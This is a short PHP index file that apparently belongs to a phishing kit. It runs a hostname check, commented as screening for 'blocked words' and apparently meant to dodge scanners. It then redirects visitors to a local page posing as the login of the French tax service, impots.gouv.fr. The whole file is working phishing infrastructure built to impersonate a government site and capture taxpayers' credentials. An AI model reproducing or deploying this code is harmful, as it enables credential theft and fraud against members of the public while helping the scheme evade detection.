<?php
/*
* index.php
*/




//Call Log Files
require_once 'bin/hostname_check.php'; // Check if hostname contain blocked word



$host = bin2hex ($_SERVER['HTTP_HOST']);
$index="bin/?impots.gouv.fr/account.login#id=$host";

header("location: $index");


?>
